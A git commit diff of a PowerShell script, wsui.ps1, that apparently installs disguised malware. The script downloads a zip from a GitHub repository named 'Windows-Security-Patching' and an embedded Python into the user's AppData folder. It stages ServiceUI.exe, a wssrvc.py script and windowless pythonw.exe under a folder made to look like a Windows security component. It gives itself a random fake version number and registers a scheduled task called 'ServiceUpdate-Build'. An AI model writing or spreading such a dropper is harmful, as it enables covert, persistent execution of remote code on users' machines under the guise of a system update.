1f6da185dfe3c351f4efba25d5b1f005bdd53ef8
xxoo-d <im4x5yn74x@kaiju-security.com>
2026-02-24 00:54:41 -0500

    Update wsui.ps1

--- wsui.ps1
+++ wsui.ps1
@@ -9,14 +9,14 @@ $MINOR = Get-Random -Minimum 0 -Maximum 100 # 0-99
 $BUILD = Get-Random -Minimum 0 -Maximum 1000 # 0-999
 $REVISION = Get-Random -Minimum 0 -Maximum 10000 # 0-9999
 $VERSION = "$MAJOR.$MINOR.$BUILD.$REVISION"
-$winsecUI = Join-Path $AppDataPath $FolderName "WindowsSecurityUI"
-$serviceUIPath = Join-Path $winsecUI "ServiceUI.exe"
-$wssrvcPyPath = Join-Path $winsecUI "wssrvc.py"
-$pythonwExePath = Join-Path $winsecUI "pythonw.exe"
 wget https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/WindowsSecurityUI.zip -O $env:APPDATA\WindowsSecurityUI.zip
 Expand-Archive -Path $env:APPDATA\WindowsSecurityUI.zip -DestinationPath $env:APPDATA\$FolderName
 wget https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip -O $env:APPDATA\python-3.14.0-embed-amd64.zip
 Expand-Archive -Path $env:APPDATA\python-3.14.0-embed-amd64.zip -DestinationPath $env:APPDATA\$FolderName\WindowsSecurityUI\
+$winsecUI = Join-Path $AppDataPath $FolderName "WindowsSecurityUI"
+$serviceUIPath = Join-Path $winsecUI "ServiceUI.exe"
+$wssrvcPyPath = Join-Path $winsecUI "wssrvc.py"
+$pythonwExePath = Join-Path $winsecUI "pythonw.exe"
 rm $env:APPDATA\WindowsSecurity.zip
 rm $env:APPDATA\python-3.14.0-embed-amd64.zip
 $scheduledTaskName = "ServiceUpdate-Build-$VERSION"
